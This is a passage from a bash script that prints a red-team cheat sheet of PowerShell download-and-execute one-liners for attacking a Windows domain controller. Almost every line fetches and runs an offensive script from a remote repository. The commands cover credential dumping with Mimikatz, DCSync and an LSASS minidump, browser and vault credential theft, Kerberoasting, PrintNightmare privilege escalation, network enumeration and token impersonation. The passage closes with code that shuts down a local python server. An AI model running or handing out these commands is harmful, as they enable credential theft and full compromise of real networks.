echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e ""
echo -e ""
echo -e ""
################################################################################
# Internal Access	                                                       #
################################################################################
echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "									${LGREEN}♠ Internal Commands ♠${RESTORE}"
echo -e "     	 					${LIGHTGRAY}This section is used for running scripts and commands internally on a Domain Controller${RESTORE}"
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "									  ${LGREEN} Credential Access ${RESTORE}"
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e ""
# Credential Dumping
echo -e "${LGREEN}Credential Dumping${RESTORE}"
echo -e ""
echo -e "${IBLUE}LSASS Memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
echo -e ""
echo -e "${IBLUE}SAM${RESTORE}"
echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-NTLMExtract.ps1);Invoke-NTLMExtract"
echo -e ""
echo -e "${IBLUE}NTDS${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-DCSync.ps1);Invoke-DCSync"
echo -e ""
echo -e "${IBLUE}Cached Domain Credentials${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""
echo -e "${LGREEN}Passwords from Credential Stores${RESTORE}"
echo -e ""
echo -e "${IBLUE}Credentials From Web Browsers${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe browsers"
echo -e "$DownloadMethod '$NishangRepo""Gather/Get-WebCredentials.ps1');Get-WebCredentials | FL"
echo -e ""
echo -e ""
echo -e "${IBLUE}Windows Credential Manager${RESTORE}"
echo -e "$DownloadMethod $PowerSploitRepo"Exfiltration/Get-VaultCredential.ps1");Get-VaultCredential"
echo -e "$DownloadMethod "$EmpireRepo"credentials/dumpCredStore.ps1)"
echo -e ""
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
# Unsecured Credentials
echo -e ""
echo -e "${LGREEN}Unsecured Credentials${RESTORE}"
echo -e ""
echo -e "${IBLUE}Credentials in Files${RESTORE}"
echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher"
echo -e ""
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
# Steal or Forge Kerberos Tickets
echo -e ""
echo -e "${LGREEN}Steal or Forge Kerberos Tickets${RESTORE}"
echo -e ""
echo -e "${IBLUE}AS-REP Roasting${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command asreproast"
echo -e ""
echo -e "${IBLUE}Kerberoasting${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command kerberoast"
echo -e ""
echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "									  ${LGREEN} Privilege Escalation ${RESTORE}"
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""
# Tools
echo -e "${LGREEN}Tools${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
echo -e ""
echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e "${IBLUE}Sherlock${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
echo -e ""
echo -e "${IBLUE}PrivescCheck${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PrivescCheck.ps1);Invoke-PrivescCheck"
echo -e ""
echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
echo -e ""
echo -e "${IBLUE}Get-System${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
echo -e ""

echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "										${LGREEN} Enumeration ${RESTORE}"
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""
# Local Enumeration
echo -e "${LGREEN}Local Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}HostRecon${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);Invoke-HostRecon"
echo -e ""
echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
echo -e ""
echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
echo -e ""
echo -e "${IBLUE}JAWS${RESTORE}"
echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
echo -e ""
echo -e ""
# Network Enumeration
echo -e "${LGREEN}Network Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>'"
echo -e ""
echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR> or <IP>' -TopPorts 50 -Open -GrepOut Scan.txt"
echo -e ""
echo -e "${IBLUE}Invoke-Bloodhound${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/BloodHound.ps1);Invoke-Bloodhound"
echo -e ""

echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "										${LGREEN} Collection ${RESTORE}"
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
#Clipboard
echo -e "" 
echo -e "${IBLUE}Get-ClipboardContents${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"collection/Get-ClipboardContents.ps1);Get-ClipboardContents"
echo -e ""
echo -e "${IBLUE}Invoke-SauronEye${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"collection/Invoke-SauronEye.ps1);Invoke-SauronEye"
echo -e ""
echo -e "${IBLUE}Out-Minidump${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"collection/Out-Minidump.ps1);Get-Process lsass | Out-Minidump"
echo -e ""
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e ""

echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "										${LGREEN} Token Impersonation ${RESTORE}"
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
#Clipboard
echo -e "" 
echo -e "${LGREEN}Create Process with Token${RESTORE}"
echo -e ""
echo -e "${IBLUE}Get-WinlogonTokenSystem${RESTORE}"
echo -e "$DownloadMethod "$GetSystemTechniquesRepo"TokenManipulation/Get-WinlogonTokenSystem.ps1);Get-WinlogonTokenSystem"
echo -e ""
echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
################################################################################
# Cleanup	                                                               #
################################################################################

sleep "3"

echo -e ""
echo -e ""
echo -e ""

if [ $LocalRepo == "True" ]
then	
	echo -e "${LYELLOW}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
	echo -e "					${LYELLOW}		---> Press '"t"' to terminate script and python server <---${RESTORE}"
	echo -e "${LYELLOW}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
	echo -e ""
	echo -e ""
	echo -e ""
	echo -e ""
	echo -e ""
	echo -e ""
	read -n 1 -s "KillScript" ynq
	
	case $KillScript in
		t)
echo -e "${LYELLOW}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
											fuser -k "$LocalPort/tcp" 2> /dev/null
		echo -e "									Script Terminated gracefully"
echo -e "${LYELLOW}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
		;;
		
	esac
fi

echo -e ""
echo -e ""
echo -e ""
echo -e ""
echo -e ""
echo -e ""


################################################################################
# End	                                                                       #
################################################################################
